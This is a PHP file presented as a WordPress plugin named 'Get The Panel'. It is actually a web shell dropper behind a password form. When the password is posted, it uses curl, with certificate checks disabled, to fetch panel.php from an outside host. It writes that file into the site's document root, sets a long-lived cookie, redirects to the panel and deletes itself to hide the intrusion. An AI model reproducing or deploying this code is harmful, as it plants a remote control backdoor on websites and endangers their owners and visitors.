<?php
/*
 * Plugin Name: Get The Panel
 * Version: 1.0.0
 * Author: VinhNoName
 * License: GPLv3
 * License URI: http://www.gnu.org/licenses/gpl-3.0
*/
if(isset($_SERVER['DOCUMENT_ROOT']) && !empty($_SERVER['DOCUMENT_ROOT'])) $root=$_SERVER['DOCUMENT_ROOT'];
else if(isset($_SERVER['SCRIPT_FILENAME']) && !empty($_SERVER['SCRIPT_FILENAME'])) $root=$_SERVER['SCRIPT_FILENAME'];
else $root=realpath(dirname(__FILE__));
//list($root)=explode($_SERVER['PHP_SELF'], $root);
$posi=strrpos($root, $_SERVER['PHP_SELF']);
if($posi===false) $root=$root; else $root=substr($root, 0, $posi);
unset($posi);

if(!empty($_POST['pass'])){
$panel=$root.'/panel.php';
if(is_file($panel)) unlink($panel);
$password=md5($_POST['pass']);
$fp=fopen($panel,'w');
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,'http://v-vinhjaxt.rhcloud.com/panel.php?tai=panel.php');
curl_setopt($ch,CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch,CURLOPT_COOKIE,'php_id='.$password);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
curl_setopt($ch, CURLOPT_MAXREDIRS, 20);
curl_setopt($ch,CURLOPT_FILE,$fp);
curl_exec($ch);
curl_close($ch);
fclose($fp);
unset($ch);
unset($fp);
if(strpos(file_get_contents($panel),'?php')!==false){
setcookie('php_id', $password, time() + 3600 * 24 * 365, '/');
header('Location: /panel.php');
echo '<script>location.href="/panel.php";</script>';
unlink(__FILE__);
exit;
}}
?><html>
<head>
<title>Login</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script type="text/javascript">function dn(){var pass=document.getElementById("pass").value;if(pass!=""){var vdn=document.getElementById("vdn");vdn.submit();}}</script>
</head>
<body>
<div align="center">
<form method="post" id="vdn" action="">
PASSWORD<br />
<input type="password" id="pass" name="pass" size="9" onMouseout="dn();" onblur="dn();" />
<br />
<input type="submit" value="Login" />
</form>
</div>
</body>
</html>
